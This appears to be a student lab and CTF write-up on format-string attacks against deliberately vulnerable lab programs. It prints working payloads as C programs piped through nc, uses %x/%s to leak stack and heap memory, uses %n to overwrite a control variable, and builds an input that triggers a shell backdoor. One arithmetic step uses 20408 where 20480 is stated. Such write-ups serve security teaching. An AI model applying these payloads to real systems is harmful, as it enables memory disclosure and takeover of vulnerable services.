# Guião Semana #7 (Format-String Vulnerability Lab)

## 2 Environment Setup

### 2.1 Turning of Countermeasure

In the initial phase, we disable address randomization because it is essential for this attack to determine the program's address locations and order.

![Alt text](<Captura de ecrã 2023-11-16 102400.png>)

Fig1. Turning of Countermeasure

### 2.2 The Vulnerable Program

After that we  compile the code, you need to type make to execute those commands. After the compilation, we need to copy the binary into the fmt-containers folder, so they can be used by the containers. The following commands conduct compilation and installation.

![Alt text](<Captura de ecrã 2023-11-16 102524.png>)

Fig2. The Vulnerable Program

### 2.3 Container Setup and Commands

![Alt text](<Captura de ecrã 2023-11-16 102643.png>)

Fig 3. Commands to Docker and Compose

To run commands on a container, we often need to get a shell on that container.  Use the "docker ps" command to find out the ID of the container, and then use "docker exec" to start a shell on that container. 

![Alt text](<Captura de ecrã 2023-11-16 102738.png>)

Fig 4. Shell on that container

## Task 1: Crashing the Program

![Alt text](<Captura de ecrã 2023-11-16 102840.png>)

Fig 5. Alias for: docker-compose up

![Alt text](<Captura de ecrã 2023-11-16 102935.png>)

Fig 6.Send a benign message to this server


## Task 2: Printing Out the Server Program’s Memory

The goal of this task is to prompt the server to display specific data stored in its memory (with the designated IP address being 10.9.0.5). It's important to note that the data will be revealed on the server side, ensuring that the attacker remains unaware of its contents. It's crucial to emphasize that this action does not constitute a meaningful attack; rather, the focus is on mastering the technique employed in this task, as it forms the foundation for subsequent objectives.


### Task 2.A: Stack Data

To print the first 4 bytes of the input from the format string, the input must contain a known value to be more easily identified. In our case we will use "ABCD", which in hexadecimal gives "41424344". The initial idea is to give as input "ABCD" concatenated with several "%08x".

![Alt text](<Captura de ecrã 2023-11-16 103048.png>)

Fig 7. To print the first 4 bytes of the input from the format string

![Alt text](<Captura de ecrã 2023-11-16 104359.png>)

Fig 8.  The server output

The final value "44434241" represents the address of the string "ABCD" provided as input. It's important to note that the constituent bytes are reversed. Between the strings "ABCD" and "44434241," there are 504 characters. Since each address consists of 8 characters (32-bit addresses), there are 504/8 = 63 addresses in the stack between the format string and the buffer.
In this program configuration, to print the first 4 bytes of the initial input, it is necessary to construct a string with precisely 64 "%x": the initial 63 to display the intermediate addresses and the last one to reveal the initial 32 bits (4 bytes) of the input.

### Task 2.B: Heap Data

In this task, our objective is to print the content of a string located in the Heap at the address 0x080b4008. Since the program to be executed on the server remains the same as in the previous task, we will apply the same principles.
The address 0x080b4008 can be encoded as a string, represented as "\x08\x0b\x40\x08". By placing this address at the beginning of the input, followed by 63 "%08x" and one "%s", the format string will then read from this address and retrieve the concealed value.
The executed code was as follows:


```
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}
```
![Alt text](<Captura de ecrã 2023-11-16 104541.png>)

Fig 9. The address's message is "A secret message".

## Task 3: Modifying the Server Program’s Memory

The goal of this assignment is to alter the value of a crucial variable named "target" within the server program (we will maintain the use of 10.9.0.5 as the server IP). Initially, the target variable is set to 0x11223344. It's important to note that this variable plays a significant role in determining the program's control flow. If external attackers can successfully modify its value, they have the potential to influence the program's behavior. There are three specific sub-tasks associated with achieving this objective.

### Task 3.A: Change the value to a different value

In this task we need to change the value of the target variable. Initially its value is 0x11223344 and the address is 0x080e5068.

The %n command in format strings writes the number of characters written up to that point into the memory area of ​​the argument passed as a parameter. The approach is very similar to the command in task 2.B, only instead of reading the selected address, we will write it. The code executed was as follows:

```
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

![Alt text](<Captura de ecrã 2023-11-16 104719.png>)

Fig 10. The output of service

### Task 3.B: Change the value to 0x5000

This time, the goal is to change the value of the "target" variable to a specific value: 0x5000, which is 20480 in decimal. Since we know that '%n' will write the number of characters printed so far, the input until '%n' must consist of 20408 characters. Given the length of the input, we utilize the notation %.NX, where N = 19980 (calculated as 20408 - 4 - 63*8), to write the remaining 19980 characters with the value 0.

```
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}

```

![Alt text](<Captura de ecrã 2023-11-16 104840.png>)

Fig 11. The value of the target is 0x00005000

## CTF Week #7 (Format Strings)

### Challenge 1

Initially, we explore the files provided on the CTF platform, which are the same as those running on the server at port 4004.

Using the checksec command, we verify that the program (compiled main.c) has an x86 architecture, its binary is not randomized, but there are protections for the return address using canaries.

![Alt text](<image-71.png>)

Fig 1. Checks the security settings of a binary program

Afterward, we evaluated the operation of the main.c code. The input is stored in a 32-byte buffer through the scanf function and then printed by printf without additional arguments. Therefore, it is possible to exploit a "format string attack" to hijack its operation, as there is no address randomization.

![Alt text](<image-72.png>)

Fig 2. main.c

When the load_flag function is invoked, it reads the flag from the directory into another buffer, which is a global variable and, consequently, is allocated in the Heap. By discovering the address of the function, it is possible to retrieve the value of the string from the buffer.

To find the address of the function, we use the gdb debugger:

![Alt text](<image-73.png>)

Fig 3. load_flag address

The result was the return address "0x08049256," which is "\x56\x92\x04\x08" in string format.

Using the provided Python program, we injected the input containing the exploit, by doing p.sendline(b"\x56\x92\x04\x08%s"):

![Alt text](<image-74.png>)

Fig 4. Flag obatined

### Challenge 2

Just like in the first challenge, we chose to check the protections of the program running on the server. The program still has an x86 architecture, its binary is not randomized, and there are protections for the return address using canaries.

![Alt text](<image-75.png>)

Fig 1. Checks the security settings of a binary program

Afterward, we analyzed the main.c code. This time, a bash is launched if the value of the key is 0xBEEF, which is 48879 in decimal. This backdoor is sufficient to control the server and thus see the content of the file flag.txt.

![Alt text](<image-76.png>)

Fig 2. main.c

To manipulate the value of key, which is a global variable and therefore allocated in the Heap, we use the format string attack on the input through the '%n' option. Initially, we need the value of the address of the key variable, and for that, we turn to gdb:

![Alt text](<image-77.png>)

Fig 3. key address

We have identified the location of the key. Leveraging scanf once again, we can exploit it by placing the address of the key in our string and passing it the value 0xBEEF using '%n'. However, there's a minor challenge:

'%n' writes the number of characters we have written so far in our string.

To address this, we can employ '%.Ax' (where A represents the number of characters we aim to read into a variable) and configure it to the desired size. Since '%x' reads from an address, we need to carefully structure our string as follows:

(address for %x) + (address for %n) + '%.Ax' + '%n'

It's important to note that writing the addresses consumes some characters in size, so we must subtract this from 0xBEEF. 

Calculating A:

Given 0xBEEF = 48879,

We've written 8 characters so far for our address, leaving us with 48879 - 8 = 48871.

This is the value we need to substitute for 'A'.

![Alt text](<image-78.png>)

Fig 5. Input injection

Upon execution, we were able to gain access to the content of the file flag.txt and obtain the challenge flag:

![Alt text](<image-79.png>)

Fig 5. Flag obatined
